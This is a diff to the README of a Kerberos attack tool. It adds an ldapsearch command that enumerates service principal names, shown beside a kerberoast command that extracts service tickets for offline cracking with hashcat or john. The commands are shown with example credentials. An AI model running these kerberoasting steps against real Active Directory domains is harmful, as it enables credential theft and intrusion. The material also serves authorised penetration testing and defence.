@@ -134,6 +134,10 @@ To format encrypted part of tickets in order to be cracked by hashcat or john.
 ```shell
 cerbero kerberoast -s services.txt --realm under.world --user Hades -p IamtheKingofD34d!!
 ```
+To get a list of services you could use `ldapsearch`:
+```shell
+ldapsearch -b "dc=under,dc=world" -w IamtheKingofD34d!! -D "Hades@under.world" "(&(samAccountType=805306368)(servicePrincipalName=*)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))" servicePrincipalName | grep servicePrincipalName: | cut -d ' ' -f 2 | tee services.txt
+```
 
 ### List
 `list` shows the tickets information of a credentials file. Similar
